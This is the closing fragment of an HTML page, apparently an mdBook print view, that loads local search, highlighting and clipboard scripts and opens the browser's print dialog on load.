            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
            </nav>

        </div>

        <script type="text/javascript">
            window.playground_copyable = true;
        </script>
        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
        <script type="text/javascript">
        window.addEventListener('load', function() {
            window.setTimeout(window.print, 100);
        });
        </script>
    </body>
</html>
